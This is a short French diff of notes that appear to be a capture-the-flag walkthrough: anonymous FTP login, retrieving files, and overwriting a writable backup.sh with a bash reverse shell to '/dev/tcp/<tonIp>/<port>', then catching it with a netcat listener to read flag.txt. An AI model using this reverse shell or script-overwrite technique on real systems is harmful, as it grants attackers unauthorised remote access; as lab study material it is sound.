@@ -1,0 +1,15 @@
+Se connecter au ftp en 'anonymous'
+
+Faire un 'ls' puis un 'cd public' pour voir le fichier 'backup.sh'
+
+Faire un 'get shoppinglist.txt' et voir le titre du film
+
+Faire un 'get backup.sh' le modifier en local pour y ajouter la commande suivante:
+	bash -i >& /dev/tcp/<tonIp>/<port> 0>&1
+
+Uploader la nouvelle version du script backup.sh, faire un 'put backup.sh' (dans le ftp)
+
+Lancer un netcat:
+	nc -lnvp <leMemePortQueDansLeScript>
+
+Attendre que le script soit executé et afficher le fichier flag.txt
